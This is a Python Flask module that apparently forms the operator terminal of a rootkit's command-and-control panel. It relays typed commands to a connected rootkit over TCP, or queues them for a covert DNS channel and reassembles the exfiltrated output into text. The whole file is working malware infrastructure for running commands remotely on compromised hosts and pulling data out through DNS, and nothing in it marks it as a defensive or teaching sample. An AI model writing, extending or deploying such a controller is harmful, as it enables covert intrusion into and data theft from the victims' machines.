from flask import Blueprint, render_template, redirect, request, url_for
from utils.state import (
    authenticated, rootkit_connection, connection_lock, command_history,
    last_response, last_channel, command_queue, exfil_buffer,
    expected_chunks, DNS_RESPONSE_TIMEOUT, DNS_POLL_INTERVAL
)
from utils.socket_comm import send_to_server, receive_from_server
import socket
import time

terminal_bp = Blueprint('terminal', __name__)

@terminal_bp.route('/')
def terminal():
    if not authenticated:
        return redirect(url_for('auth.login'))
    return render_template("terminal.html", response=last_response, history=command_history, last_channel=last_channel)

@terminal_bp.route('/send', methods=['POST'])
def send_command():
    global last_channel, last_response

    if not authenticated:
        return redirect(url_for('auth.login'))

    channel = request.form.get('channel', 'tcp')
    last_channel = channel
    cmd = request.form.get('command', '').strip()
    if not cmd:
        return redirect(url_for('terminal.terminal'))

    command_entry = {"command": cmd, "stdout": "", "stderr": ""}
    command_history.append(command_entry)

    if channel == 'dns':
        command_queue.append(cmd)
        last_response = {"stdout": "", "stderr": "⏳ Queued via DNS"}
        text = _assemble_exfil()
        if text:
            last_response = {"stdout": text, "stderr": ""}
            command_entry["stdout"] = text
        else:
            last_response = {"stdout": "", "stderr": "⚠️ no DNS response"}
            command_entry["stderr"] = last_response["stderr"]
    else:
        try:
            with connection_lock:
                send_to_server(rootkit_connection, cmd)
                if 'killcom' in cmd.lower():
                    rootkit_connection.close()
                    last_response = {"stdout": "", "stderr": "Connexion terminée."}
                    return redirect(url_for('dashboard.dashboard'))

                chunks = []
                rootkit_connection.settimeout(1)
                while True:
                    try:
                        part = receive_from_server(rootkit_connection)
                        if not part:
                            break
                        chunks.append(part)
                    except socket.timeout:
                        break
                rootkit_connection.settimeout(None)

                response = ''.join(chunks)

                if "stdout:" in response and "stderr:" in response:
                    stdout_content = response.split("stderr:")[0].split("stdout:")[1].strip()
                    stderr_content = response.split("stderr:")[1].strip()
                    last_response = {"stdout": stdout_content, "stderr": stderr_content}
                    command_entry["stdout"] = stdout_content
                    command_entry["stderr"] = stderr_content
                else:
                    last_response = {"stdout": response.strip(), "stderr": ""}
                    command_entry["stdout"] = response.strip()

        except Exception as e:
            last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}

    return redirect(url_for('terminal.terminal'))

def _assemble_exfil(timeout=DNS_RESPONSE_TIMEOUT, poll=DNS_POLL_INTERVAL):
    global expected_chunks, exfil_buffer
    start = time.time()
    while True:
        if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
            break
        if time.time() - start > timeout:
            break
        time.sleep(poll)

    if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
        data = b''.join(exfil_buffer[i] for i in range(expected_chunks))
        text = data.decode(errors='ignore')
    else:
        text = ""

    expected_chunks = None
    exfil_buffer.clear()
    return text
